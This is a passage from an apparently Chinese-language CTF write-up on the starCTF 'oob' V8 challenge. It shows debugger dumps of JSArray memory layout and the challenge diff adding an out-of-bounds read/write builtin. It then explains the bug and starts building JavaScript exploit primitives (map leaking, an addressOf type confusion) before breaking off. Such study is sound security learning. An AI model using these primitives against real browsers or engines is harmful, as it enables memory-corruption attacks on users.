class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„<code>%DebugPrint(int_arr)</code>çš„ä½œç”¨æ˜¯æ‰“å°å‡º<code>int_arr</code>çš„å†…å­˜ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯æ‰“å°å‡ºå†…å­˜åœ°å€ã€‚åé¢çš„<code>%SystemBreak()</code>å‡½æ•°åˆ™æ˜¯å°†æ§åˆ¶æƒäº¤ç»™gdbã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">0x011117f8df01 &lt;JSArray[3]&gt;</span><br><span class="line">... ...</span><br><span class="line">pwndbg&gt; job 0x011117f8df01</span><br><span class="line">0x11117f8df01: [JSArray]</span><br><span class="line"> - map: 0x07bd46242d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8de19 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8de19 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8df01-1</span><br><span class="line">00:0000â”‚  0x11117f8df00 â€”â–¸ 0x7bd46242d99 â—‚â€” 0x40000020b620c01</span><br><span class="line">01:0008â”‚  0x11117f8df08 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">02:0010â”‚  0x11117f8df10 â€”â–¸ 0x11117f8de19 â—‚â€” 0x20b620c08</span><br><span class="line">03:0018â”‚  0x11117f8df18 â—‚â€” 0x300000000</span><br><span class="line">04:0020â”‚  0x11117f8df20 â€”â–¸ 0x20b620c14f9 â—‚â€” 0x20b620c01</span><br><span class="line">05:0028â”‚  0x11117f8df28 â—‚â€” 0x300000000</span><br><span class="line">06:0030â”‚  0x11117f8df30 â—‚â€” 0x3ff199999999999a</span><br><span class="line">07:0038â”‚  0x11117f8df38 â—‚â€” 0x3ff3333333333333</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8de19-1</span><br><span class="line">00:0000â”‚  0x11117f8de18 â€”â–¸ 0x20b620c0851 â—‚â€” 0x20b620c01</span><br><span class="line">01:0008â”‚  0x11117f8de20 â—‚â€” 0x300000000</span><br><span class="line">02:0010â”‚  0x11117f8de28 â—‚â€” 0x100000000</span><br><span class="line">03:0018â”‚  0x11117f8de30 â—‚â€” 0x200000000</span><br><span class="line">04:0020â”‚  0x11117f8de38 â—‚â€” 0x300000000</span><br><span class="line">05:0028â”‚  0x11117f8de40 â€”â–¸ 0x20b620c0801 â—‚â€” 0x20b620c01</span><br><span class="line">06:0030â”‚  0x11117f8de48 â—‚â€” 0x300000000</span><br><span class="line">07:0038â”‚  0x11117f8de50 â€”â–¸ 0xeff64df451 â—‚â€” 0x9a0000020b620c05</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæ‰“å°å‡ºæ¥çš„æ˜¯ä¸€ä¸ªintç±»å‹çš„æ•°ç»„ï¼Œåœ¨ä½¿ç”¨jobå‘½ä»¤å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°è¿™å—å†…å­˜çš„æ•°æ®ç»“æ„ã€‚é¦–å…ˆæ˜¯ä¸€ä¸ªæŒ‡å‘mapçš„æŒ‡é’ˆï¼Œéšååœ¨jobæ˜¾ç¤ºçš„å’Œ<code>telescope</code>å‡ºæ¥çš„å†…å®¹æœ‰ä¸€å®šå‡ºå…¥ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç›¸ä¿¡<code>telescope</code>ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªæˆå‘˜åº”è¯¥æ˜¯<code>properties</code>ï¼Œéšåå°±æ˜¯<code>elements</code>æŒ‡é’ˆï¼Œæœ€åå°±æ˜¯<code>length</code>ã€‚å¯ä»¥çœ‹å‡ºæ¥<code>elements</code>æŒ‡é’ˆå°±æ˜¯çœŸæ­£æŒ‡å‘æ•°æ®çš„æŒ‡é’ˆï¼Œå¹¶ä¸”åœ¨åé¢ç´§è·Ÿäº†<code>elements</code>å†…å­˜åŒºåŸŸçš„ç»“æ„ã€‚</p><h2 id="starCTF-oob"><a href="#starCTF-oob" class="headerlink" title="starCTF oob"></a>starCTF oob</h2><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>æ•´ä¸ªé¢˜ç›®å°±åªæœ‰è¿™æ ·ä¸€ä¸ªdiffæ–‡ä»¶ï¼Œè¿™é‡Œä¸»è¦éœ€è¦æ³¨æ„çš„æ˜¯ä¸­é—´é‚£ä¸€å—+å·åŒºåŸŸï¼Œåœ¨å‘¨å›´åªæ˜¯ä¸ºäº†èƒ½å¤Ÿæ­£å¸¸è¿›è¡Œç¼–è¯‘æ‰æ·»åŠ çš„ã€‚</p><p>å¯ä»¥çœ‹åˆ°æ·»åŠ çš„è¿™ä¸ªå‡½æ•°åœ¨ä¸€å¼€å§‹å°±å¯¹å‚æ•°çš„æ•°é‡è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœå‚æ•°æ•°é‡å¤§äº2åˆ™è¿”å›<code>undefined</code>ï¼Œéšåæ¥å—ç¬¬ä¸€ä¸ªåˆ°<code>receiver</code>ä¸­ï¼Œè¿›ä¸€æ­¥å¾—åˆ°JSArrayç»“æ„çš„å˜é‡arrayï¼Œç´§æ¥ç€é€šè¿‡arrayå˜é‡å–å‡ºå¯¹åº”çš„<code>elements</code>ï¼Œå¹¶ä¸”åœ¨æœ€åæ‹¿åˆ°äº†æ•°ç»„çš„é•¿åº¦ã€‚</p><p>ç„¶åå‡½æ•°åˆè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœå‚æ•°çš„æ•°é‡ä¸º1åˆ™è¿”å›æ•°ç»„æœ«å°¾çš„åä¸€ä¸ªåœ°å€çš„å€¼ï¼Œä¹Ÿå°±å‡ºç°äº†è¶Šç•Œè¯»å–çš„æ¼æ´ã€‚</p><p>å¦‚æœå‚æ•°çš„æ•°é‡ä¸º2åˆ™è·å–ç¬¬äºŒä¸ªå‚æ•°åˆ°<code>value</code>ä¸­ï¼Œç„¶åå†™åˆ°æ•°ç»„æœ«å°¾çš„åä¸€ä¸ªåœ°å€ï¼Œä¹Ÿå°±å‡ºç°äº†è¶Šç•Œå†™çš„æ¼æ´ã€‚</p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œå‡½æ•°å‚æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°é»˜è®¤ä¸ºthisï¼Œæ‰€ä»¥ test_arr.oob() çš„å«ä¹‰ä¸ºä¸€ä¸ªå‚æ•°</strong></p><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>å…¶å®é€šè¿‡å‰é¢çš„åŸºç¡€çŸ¥è¯†ç« èŠ‚å’Œè¿™é‡Œçš„æ¼æ´åˆ†æä¹‹åå¯ä»¥å¾ˆå®¹æ˜“çš„çœ‹å‡ºæ¥ï¼Œåœ¨æ“ä½œæ•°ç»„ä¸­çš„å†…å®¹æ—¶éƒ½æ˜¯è¿™æ ·ä¸€å±‚ä¸€å±‚æ‰¾ä¸‹å»çš„ã€‚</p><p>è€Œåœ¨jsä¸­å¯¹äºæ•°ç»„ä¸­ä¸æ˜¯åªèƒ½å­˜æ”¾æ•´å‹çš„å˜é‡ï¼Œè¿˜å¯ä»¥å­˜æ”¾å„ç§ç±»å‹çš„å¯¹è±¡ï¼Œè€Œå¦‚ä½•åŒºåˆ†æ•°ç»„ä¸­å˜é‡ç±»å‹å°±éœ€è¦ç”¨åˆ°<code>JSArray</code>ä¸­çš„mapæˆå‘˜è¿›è¡ŒåŒºåˆ†ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹mapæˆå‘˜å³å¯å®ç°ç±»å‹æ··æ·†ã€‚</p><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>è™½ç„¶æ˜¯æ‰¾åˆ°äº†æ¼æ´ç‚¹ï¼Œå¹¶ä¸”ä¹ŸçŸ¥é“äº†å­˜åœ¨ç±»å‹æ··æ·†çš„å¯èƒ½æ€§ï¼Œä½†æ ¹æ®ç›®å‰çš„æƒ…å†µä»æ— æ³•ç»§ç»­æ“ä½œã€‚å› ä¸ºå¯ä»¥çœ‹åˆ°å‰é¢æˆ‘ä»¬åœ¨çœ‹<code>elements</code>ç»“æ„ä¸­å¹¶æ²¡æœ‰çœ‹åˆ°mapï¼Œä¹Ÿå°±æ— åˆ©ç”¨ä¹‹è°ˆäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x011117f8df49</span><br><span class="line">0x11117f8df49: [JSArray]</span><br><span class="line"> - map: 0x07bd46242ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8df21 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8df21 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 1.2</span><br><span class="line">           2: 1.3</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8df49-1</span><br><span class="line">00:0000â”‚  0x11117f8df48 â€”â–¸ 0x7bd46242ed9 â—‚â€” 0x40000020b620c01</span><br><span class="line">01:0008â”‚  0x11117f8df50 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">02:0010â”‚  0x11117f8df58 â€”â–¸ 0x11117f8df21 â—‚â€” 0x20b620c14</span><br><span class="line">03:0018â”‚  0x11117f8df60 â—‚â€” 0x300000000</span><br><span class="line">04:0020â”‚  0x11117f8df68 â€”â–¸ 0x7bd4624ab39 â—‚â€” 0x40000020b620c01</span><br><span class="line">05:0028â”‚  0x11117f8df70 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">06:0030â”‚  0x11117f8df78 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">07:0038â”‚  0x11117f8df80 â—‚â€” 0x100000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8df21-1</span><br><span class="line">00:0000â”‚  0x11117f8df20 â€”â–¸ 0x20b620c14f9 â—‚â€” 0x20b620c01</span><br><span class="line">01:0008â”‚  0x11117f8df28 â—‚â€” 0x300000000</span><br><span class="line">02:0010â”‚  0x11117f8df30 â—‚â€” 0x3ff199999999999a</span><br><span class="line">03:0018â”‚  0x11117f8df38 â—‚â€” 0x3ff3333333333333</span><br><span class="line">04:0020â”‚  0x11117f8df40 â—‚â€” 0x3ff4cccccccccccd</span><br><span class="line">05:0028â”‚  0x11117f8df48 â€”â–¸ 0x7bd46242ed9 â—‚â€” 0x40000020b620c01</span><br><span class="line">06:0030â”‚  0x11117f8df50 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">07:0038â”‚  0x11117f8df58 â€”â–¸ 0x11117f8df21 â—‚â€” 0x20b620c14</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨åç»­çœ‹æµ®ç‚¹æ•°ä¸­å¯ä»¥çœ‹åˆ°mapçš„åœ°å€ç´§é‚»è€…<code>elements</code>çš„æ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x011117f8dfe1</span><br><span class="line">0x11117f8dfe1: [JSArray]</span><br><span class="line"> - map: 0x07bd46242f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8dfb9 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8dfb9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">         0-2: 0x011117f8df69 &lt;Object map = 0x7bd4624ab39&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8dfe1-1 20</span><br><span class="line">00:0000â”‚  0x11117f8dfe0 â€”â–¸ 0x7bd46242f79 â—‚â€” 0x40000020b620c01</span><br><span class="line">01:0008â”‚  0x11117f8dfe8 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">02:0010â”‚  0x11117f8dff0 â€”â–¸ 0x11117f8dfb9 â—‚â€” 0x20b620c08</span><br><span class="line">03:0018â”‚  0x11117f8dff8 â—‚â€” 0x300000000</span><br><span class="line">04:0020â”‚  0x11117f8e000 â€”â–¸ 0x7bd46242e89 â—‚â€” 0x40000020b620c01</span><br><span class="line">05:0028â”‚  0x11117f8e008 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">06:0030â”‚  0x11117f8e010 â€”â–¸ 0x11117f8e031 â—‚â€” 0x20b620c08</span><br><span class="line">07:0038â”‚  0x11117f8e018 â—‚â€” 0x300000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8dfb9-1</span><br><span class="line">00:0000â”‚  0x11117f8dfb8 â€”â–¸ 0x20b620c0801 â—‚â€” 0x20b620c01</span><br><span class="line">01:0008â”‚  0x11117f8dfc0 â—‚â€” 0x300000000</span><br><span class="line">02:0010â”‚  0x11117f8dfc8 â€”â–¸ 0x11117f8df69 â—‚â€” 0x71000007bd4624ab</span><br><span class="line">... â†“     2 skipped</span><br><span class="line">05:0028â”‚  0x11117f8dfe0 â€”â–¸ 0x7bd46242f79 â—‚â€” 0x40000020b620c01</span><br><span class="line">06:0030â”‚  0x11117f8dfe8 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">07:0038â”‚  0x11117f8dff0 â€”â–¸ 0x11117f8dfb9 â—‚â€” 0x20b620c08</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œæˆ‘ä»¬åœ¨æ•°ç»„ä¸­å…¨æ˜¯å¯¹è±¡çš„æ—¶å€™ä¹Ÿå¯ä»¥çœ‹åˆ°mapçš„åœ°å€ç´§é‚»ç€è¿™äº›æ•°æ®ã€‚</p><p>æ³¨æ„é‚£ä¸ªåœ°å€çš„æœ€åï¼Œå®ƒçš„å€¼çœ‹èµ·æ¥ä¸æ˜¯å¯¹é½çš„ã€‚è¿™æ˜¯å› ä¸ºv8é‡Œæœ‰ä¸ª<code>tagged pointer</code>æœºåˆ¶ï¼Œä¸€ä¸ªåœ°å€æŒ‡å‘çš„å¦‚æœä¸æ˜¯SMIï¼ˆå°±æ˜¯å°æ•´æ•°)ï¼Œå®ƒçš„æœ€ä½ä½å°±ä¼šæ‰“ä¸Šä¸€ä¸ªæ ‡è®°ï¼Œå°±ä¼šæœ‰ä¸ª1ï¼Œçœ‹èµ·æ¥å°±ä¸æ˜¯å¯¹é½çš„ï¼Œç”¨çš„æ—¶å€™è¦å‡1ã€‚</p><p>æ¥ç€éœ€è¦æ€è€ƒçš„äº‹ï¼Œä¸€ä¸ªè¶Šç•Œè¯»å†™èƒ½ç»™æˆ‘é€ æˆä»€ä¹ˆæ ·çš„æ•ˆæœå‘¢ï¼Ÿ</p><h4 id="1-æ³„æ¼mapåœ°å€"><a href="#1-æ³„æ¼mapåœ°å€" class="headerlink" title="1. æ³„æ¼mapåœ°å€"></a><strong>1. æ³„æ¼mapåœ°å€</strong></h4><p>è¿™é‡Œæ³„æ¼mapåœ°å€å°±å¾ˆç®€å•ï¼Œåœ¨æ•°ç»„ä¸­çš„æˆå‘˜ä¸ºå¯¹è±¡å’Œæµ®ç‚¹å‹çš„æ—¶å€™ç›´æ¥è°ƒç”¨oobå‡½æ•°å³å¯è·å–åˆ°ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure><h4 id="2-ç±»å‹æ··æ·†è·å–ä»»æ„å¯¹è±¡åœ°å€"><a href="#2-ç±»å‹æ··æ·†è·å–ä»»æ„å¯¹è±¡åœ°å€" class="headerlink" title="2. ç±»å‹æ··æ·†è·å–ä»»æ„å¯¹è±¡åœ°å€"></a><strong>2. ç±»å‹æ··æ·†è·å–ä»»æ„å¯¹è±¡åœ°å€</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">  obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">  obj_array.oob(flt_array_map);</span><br><span class="line">  <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">  obj_array.oob(obj_array_map);</span><br><span class="line">  <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„å®ç°åŸç†ä¹Ÿæ˜¯éå¸¸ç®€å•ï¼Œé¦–å…ˆå°±æ˜¯å°†éœ€è¦è·å–åœ°å€çš„å¯¹è±¡æ”¾åˆ°<code>obj_array</code>ä¸­ï¼Œéšåä½¿ç”¨<code>oob</code>å‡½æ•°å°†<code>flt_array_map</code>çš„åœ°å€å†™è¿›å»ï¼Œè¿™æ—¶å†å»è®¿é—®<code>obj_array</code>ä¸­çš„æˆå‘˜æ—¶å°±ä¼šä»¥floatçš„å½¢å¼è¿”å›å‡ºå¯¹åº”çš„åœ°å€äº†ï¼Œæœ€ååœ¨æ¢å¤ç±»å‹å³å¯ã€‚</p><h4 id="3-è®²ä»»æ„åœ°å€å½“ä½œå¯¹è±¡"><a href="#3-è®²ä»»æ„åœ°å€å½“ä½œå¯¹è±¡" class="headerlink" title="3. è®²ä»»æ„åœ°å€å½“ä½œå¯¹è±¡"></a><strong>3. è®²ä»»æ„åœ°å€å½“ä½œå¯¹è±¡</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span 